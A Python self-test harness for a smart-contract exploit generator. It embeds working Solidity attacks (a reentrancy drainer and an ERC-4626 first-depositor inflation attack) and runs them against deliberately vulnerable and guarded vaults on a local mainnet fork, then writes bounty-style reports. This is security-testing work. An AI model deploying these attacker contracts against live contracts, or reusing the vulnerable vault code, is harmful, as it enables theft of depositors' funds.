"""Self-test for the reentrancy chain-exploit generator.

Proves the profit-gate works IN BOTH DIRECTIONS against controlled targets deployed on a mainnet fork:
  * VULNERABLE target (deposit -> withdraw sends value BEFORE zeroing, no guard): the generator's attacker
    re-enters withdraw() in receive() and the profit assertion PASSES -> CONFIRMED (green).
  * SAFE target (identical shape + nonReentrant): the same attacker/template runs, the re-entry reverts,
    the attacker nets nothing and the profit assertion FAILS -> no_profit -> DISCARDED (negative control).

This is a HARNESS self-test, not a historical reproduction and not a claim that any real contract is
exploitable. It only proves: the template compiles, the attacker deploys, the fork executes the chain, and
the profit gate holds both ways. Every test carries `require(block.chainid == 1)` and never broadcasts.
"""
from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path

from .chain_exploit import NATIVE_TOKEN, build_immunefi_report
from .forge_verify import _ensure_forge_std, forge_bin

# The attacker contract is the generator's reentrancy template shape (chain_exploit._REENTER_TAIL): a
# contract whose receive() re-enters the flagged withdraw(). Inlined here so the self-test deploys the
# target itself (the generator targets an existing address; the self-test deploys a controlled one).
_REENTER = """
contract Reenter {
    address public target; bytes public recall; uint256 public left;
    constructor(address t) { target = t; }
    function run() external {
        left = 5;
        recall = abi.encodeWithSignature("withdraw()");
        target.call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
        (bool ok, ) = target.call(recall);
        require(ok || address(this).balance > 0, "no entry");
    }
    receive() external payable { if (left > 0) { left--; target.call(recall); } }
}
"""

_HEAD = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2} from "forge-std/Test.sol";
interface IAgg { function latestRoundData() external view returns (uint80,int256,uint256,uint256,uint80); }
"""

# __MOD__ = "" (vulnerable) or "nonReentrant" (safe). Value is sent BEFORE the state write either way; the
# nonReentrant lock is what defeats the re-entry in the safe variant.
_VAULT = """
contract Vault {
    mapping(address => uint256) public balances;
    bool private _lock;
    modifier nonReentrant() { require(!_lock, "reent"); _lock = true; _; _lock = false; }
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external __MOD__ {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no bal");
        (bool ok, ) = msg.sender.call{value: bal}("");   // external call BEFORE the state write
        require(ok, "send");
        balances[msg.sender] = 0;
    }
    receive() external payable {}
}
"""

_TEST = """
contract PoC is Test {
    uint256 constant EXPECTED_CHAINID = 1;
    address constant ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
    function test_reentrancy() public {
        Vault v = new Vault();
        address victim = address(0xBEEF);
        vm.deal(victim, 10 ether);
        vm.prank(victim); v.deposit{value: 10 ether}();
        Reenter att = new Reenter(address(v));
        vm.deal(address(att), 1 ether);              // the attacker's OWN stake, nothing injected after
        uint256 bef = address(att).balance;
        att.run();
        uint256 aft = address(att).balance;
        int256 profit = int256(aft) - int256(bef);
        console2.log("CHAIN_PROFIT_WEI", profit);
        (, int256 px,,,) = IAgg(ETH_USD).latestRoundData();
        console2.log("ETH_USD_8DP", uint256(px));
        if (profit > 0) { console2.log("GAIN_USD", uint256(profit) * uint256(px) / 1e8 / 1e18); }
        assertGt(aft, bef, "no profit: attacker balance did not increase");   // the gate
    }
}
"""


def build_selftest_sol(vulnerable: bool) -> str:
    """Full Foundry self-test .sol: vulnerable (no guard) or safe (nonReentrant), same attacker/template."""
    return _HEAD + _VAULT.replace("__MOD__", "" if vulnerable else "nonReentrant") + _REENTER + _TEST


# =====================================================================================================
# ERC-4626 first-depositor / inflation self-test.
# Attack (same chain on both vaults): attacker makes a 1-wei first deposit, DONATES underlying straight to
# the vault to inflate assets-per-share, a victim deposits (rounds to ~0 shares on the vulnerable vault),
# attacker redeems its single share for the whole inflated pool - capturing the victim's deposit.
#   VULNERABLE: no MINIMUM_LIQUIDITY lock -> the 1-wei share mints, inflation works, attacker profits.
#   SAFE: MINIMUM_LIQUIDITY dead-shares lock -> the 1-wei first deposit reverts (require s > MIN), the
#         attacker never gets a share, its donation is captured by the victim, attacker LOSES -> discarded.
_ERC4626_SELFTEST = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console2} from "forge-std/Test.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract Vault {
    MockERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public shares;
    bool public immutable guarded;
    uint256 constant MIN = 1000;                               // MINIMUM_LIQUIDITY
    constructor(MockERC20 a, bool g) { asset = a; guarded = g; }
    function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); }
    function deposit(uint256 assets, address to) external returns (uint256 s) {
        uint256 ts = totalSupply;
        s = ts == 0 ? assets : assets * ts / totalAssets();
        asset.transferFrom(msg.sender, address(this), assets);
        if (ts == 0 && guarded) {                              // safe: lock dead shares on first deposit
            require(s > MIN, "min liq");
            shares[address(0xdead)] += MIN; totalSupply += MIN; s -= MIN;
        }
        shares[to] += s; totalSupply += s;
    }
    function redeem(uint256 s, address to) external returns (uint256 a) {
        a = s * totalAssets() / totalSupply;
        shares[msg.sender] -= s; totalSupply -= s;
        asset.transfer(to, a);
    }
}

contract PoC is Test {
    uint256 constant EXPECTED_CHAINID = 1;
    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
    function test_erc4626_inflation() public {
        MockERC20 tok = new MockERC20();
        Vault v = new Vault(tok, __GUARDED__);
        address attacker = address(0xA11CE);
        address victim = address(0xBEEF);
        uint256 donation = 1000 ether;
        uint256 victimDep = 500 ether;
        tok.mint(attacker, donation + 1 ether);
        tok.mint(victim, victimDep);
        uint256 attBefore = tok.balanceOf(attacker);
        vm.startPrank(attacker);
        tok.approve(address(v), type(uint256).max);
        try v.deposit(1, attacker) {} catch {}                 // 1-wei first deposit (reverts on safe vault)
        tok.transfer(address(v), donation);                    // donation inflates assets-per-share
        vm.stopPrank();
        vm.startPrank(victim);
        tok.approve(address(v), type(uint256).max);
        try v.deposit(victimDep, victim) {} catch {}
        vm.stopPrank();
        vm.startPrank(attacker);
        uint256 sh = v.shares(attacker);
        if (sh > 0) { try v.redeem(sh, attacker) {} catch {} }
        vm.stopPrank();
        uint256 attAfter = tok.balanceOf(attacker);
        console2.log("CHAIN_PROFIT_WEI", int256(attAfter) - int256(attBefore));
        assertGt(attAfter, attBefore, "no profit: inflation did not capture the victim deposit");
    }
}
"""


def build_erc4626_selftest_sol(vulnerable: bool) -> str:
    """ERC-4626 inflation self-test: vulnerable (no MIN_LIQUIDITY) or safe (dead-shares lock)."""
    return _ERC4626_SELFTEST.replace("__GUARDED__", "false" if vulnerable else "true")


_PROFIT_RE = re.compile(r"CHAIN_PROFIT_WEI\s+(-?\d+)")
_PX_RE = re.compile(r"ETH_USD_8DP\s+(\d+)")


def _run(forge: str, proj: Path, name: str, sol: str, rpc_url: str, timeout: int = 160):
    d = proj / "test" / "gen" / "selftest"
    d.mkdir(parents=True, exist_ok=True)
    for old in d.glob("*.t.sol"):
        try: old.unlink()
        except OSError: pass
    p = d / f"{name}.t.sol"
    p.write_text(sol, encoding="utf-8")
    r = subprocess.run([forge, "test", "--mp", str(p.relative_to(proj)), "--fork-url", rpc_url, "-vv"],
                       cwd=proj, capture_output=True, text=True, timeout=timeout)
    out = r.stdout + "\n" + r.stderr
    passed = re.search(r"\[PASS\]\s+test_reentrancy", out) is not None
    pm = _PROFIT_RE.search(out)
    profit = int(pm.group(1)) if pm else 0
    pxm = _PX_RE.search(out)
    eth_usd = (int(pxm.group(1)) / 1e8) if pxm else 0.0
    return {"passed": passed, "profit_wei": profit, "eth_usd": eth_usd, "test_path": str(p), "out": out}


def run_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
    """Run BOTH directions on a fork. Returns a dict; 'green' is True only when the vulnerable target
    CONFIRMS (pass + profit>0) AND the safe target DISCARDS (profit<=0, assertion fails). Writes the report
    and README into out_dir. Raises nothing - the caller inspects the result."""
    forge = forge_bin()
    if not forge or not rpc_url:
        return {"green": False, "error": "forge or rpc unavailable"}
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return {"green": False, "error": "forge-std unavailable"}

    vuln = _run(forge, proj, "VulnVault_withdraw", build_selftest_sol(True), rpc_url)
    safe = _run(forge, proj, "SafeVault_withdraw", build_selftest_sol(False), rpc_url)

    # Template-bug guard: a confirmation must come with positive profit, never a bare pass.
    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
    green = vuln_confirmed and safe_discarded

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    report_path = ""
    if vuln_confirmed:
        gain_usd = vuln["profit_wei"] / 1e18 * vuln["eth_usd"]
        trace = "\n".join(l for l in vuln["out"].splitlines()
                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|ETH_USD|GAIN_USD|Suite result", l))[:1500]
        snippet = ('function withdraw() external {\n'
                   '    uint256 bal = balances[msg.sender];\n'
                   '    require(bal > 0);\n'
                   '    (bool ok, ) = msg.sender.call{value: bal}("");   // call BEFORE the state write\n'
                   '    require(ok);\n'
                   '    balances[msg.sender] = 0;                         // settled too late\n'
                   '}')
        md = build_immunefi_report("VulnVault", "(controlled target, deployed on the fork)", "withdraw",
                                   vuln["profit_wei"], gain_usd, vuln["eth_usd"], NATIVE_TOKEN,
                                   vuln["test_path"], trace, snippet)
        md = "> **Harness self-test — controlled target, not a historical reproduction.**\n\n" + md
        report_path = str(out_dir / f"self_test_reentrancy_{ts}.md")
        Path(report_path).write_text(md, encoding="utf-8")

    readme = f"""# Reentrancy chain-exploit — harness self-test

Status: {"GREEN (both directions)" if green else "NOT GREEN"}  ·  generated {ts} UTC

## What this proves
The reentrancy chain-exploit generator works **in both directions** of the profit gate, on a mainnet fork:

| Target (deployed on the fork) | Guard | Expected | Result |
|---|---|---|---|
| VulnVault.withdraw() | none (call before zeroing) | CONFIRMED (attacker profits) | {"PASS, +" + str(vuln["profit_wei"]) + " wei" if vuln_confirmed else "unexpected: " + str(vuln)} |
| SafeVault.withdraw() | nonReentrant | DISCARDED (no profit) | {"discarded (profit " + str(safe["profit_wei"]) + ")" if safe_discarded else "unexpected: " + str(safe)} |

Specifically it proves: the template **compiles**, the attacker contract **deploys**, the fork **executes**
the full attack chain, and the **profit assertion is the gate** — it confirms a real drain and discards a
guarded contract. The `require(block.chainid == 1)` fork-guard is present and nothing is broadcast.

## What this does NOT prove
- It is **not** a reproduction of any historical exploit, and makes **no claim** that any real deployed
  contract is exploitable. Both targets are controlled contracts deployed inside the test.
- A pass without positive profit is treated as a **build failure**, never a finding.

## Re-run
`forge test --match-path 'test/gen/selftest/**' --fork-url <mainnet-rpc>` (local fork only).
"""
    Path(out_dir / "SELFTEST_README.md").write_text(readme, encoding="utf-8")

    return {"green": green, "vuln": vuln, "safe": safe, "vuln_confirmed": vuln_confirmed,
            "safe_discarded": safe_discarded, "report_path": report_path,
            "readme_path": str(out_dir / "SELFTEST_README.md")}


def run_erc4626_self_test(rpc_url: str, out_dir: Path, workdir: Path | None = None) -> dict:
    """ERC-4626 inflation self-test, both directions. VULNERABLE (no MIN_LIQUIDITY) must CONFIRM (attacker
    captures the victim deposit, profit>0); SAFE (dead-shares lock) must DISCARD (attacker loses its
    donation, profit<=0). Writes self_test_erc4626_<ts>.md + updates the README. 'green' iff both hold."""
    forge = forge_bin()
    if not forge or not rpc_url:
        return {"green": False, "error": "forge or rpc unavailable"}
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "chain"))
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return {"green": False, "error": "forge-std unavailable"}

    def _run4626(name, sol):
        d = proj / "test" / "gen" / "selftest4626"
        d.mkdir(parents=True, exist_ok=True)
        for old in d.glob("*.t.sol"):
            try: old.unlink()
            except OSError: pass
        p = d / f"{name}.t.sol"
        p.write_text(sol, encoding="utf-8")
        r = subprocess.run([forge, "test", "--mp", str(p.relative_to(proj)), "--fork-url", rpc_url, "-vv"],
                           cwd=proj, capture_output=True, text=True, timeout=160)
        out = r.stdout + "\n" + r.stderr
        passed = re.search(r"\[PASS\]\s+test_erc4626", out) is not None
        pm = _PROFIT_RE.search(out)
        return {"passed": passed, "profit_wei": int(pm.group(1)) if pm else 0, "test_path": str(p), "out": out}

    vuln = _run4626("VulnVault4626", build_erc4626_selftest_sol(True))
    safe = _run4626("SafeVault4626", build_erc4626_selftest_sol(False))
    vuln_confirmed = vuln["passed"] and vuln["profit_wei"] > 0
    safe_discarded = (not safe["passed"]) and safe["profit_wei"] <= 0
    green = vuln_confirmed and safe_discarded

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S", time.gmtime())
    report_path = ""
    if vuln_confirmed:
        trace = "\n".join(l for l in vuln["out"].splitlines()
                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
        md = f"""> **Harness self-test — controlled target, not a historical reproduction.**

# ERC-4626 first-depositor inflation captures a victim deposit

**Chain:** ethereum (fork)  ·  **Contract:** (controlled Vault, deployed on the fork)  ·  **Verdict:** CONFIRMED

## Description
A share vault with no MINIMUM_LIQUIDITY lock lets the first depositor mint 1 wei of shares, then DONATE
assets straight to the vault to inflate assets-per-share. A later victim's deposit rounds down to ~0 shares,
and the attacker redeems its single share for the whole inflated pool — capturing the victim's deposit.
Proven on a fork: the attacker netted **{vuln['profit_wei']} wei** of the underlying (the victim's deposit).

## Vulnerability Details
`deposit()` computes `shares = assets * totalSupply / totalAssets` with no minimum-liquidity / dead-shares
lock, so a donation after a 1-wei first mint inflates the price and rounds the next depositor to zero.

## Impact Details
- **Captured on the fork:** {vuln['profit_wei']} wei of the vault's underlying ERC-20 (the victim's deposit).
- Any later depositor whose amount rounds below one share is fully absorbed.

## Proof of Concept
Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`
```
{trace}
```
Negative control (same template, safe vault with a MINIMUM_LIQUIDITY dead-shares lock): profit {safe['profit_wei']} wei → **discarded**.

## Recommendation
Mint a MINIMUM_LIQUIDITY of dead shares on the first deposit (or use OpenZeppelin ERC4626 virtual-shares /
decimals offset) so share price cannot be inflated and small deposits never round to zero.
"""
        report_path = str(out_dir / f"self_test_erc4626_{ts}.md")
        Path(report_path).write_text(md, encoding="utf-8")

    readme = out_dir / "SELFTEST_README.md"
    extra = (f"\n\n## ERC-4626 inflation ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
             f"| Target | Guard | Expected | Result |\n|---|---|---|---|\n"
             f"| Vault.deposit/redeem | none (no MIN_LIQUIDITY) | CONFIRMED | "
             f"{'PASS, +' + str(vuln['profit_wei']) + ' wei captured' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
             f"| Vault.deposit/redeem | MINIMUM_LIQUIDITY dead-shares | DISCARDED | "
             f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
    try:
        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
    except OSError:
        pass

    return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
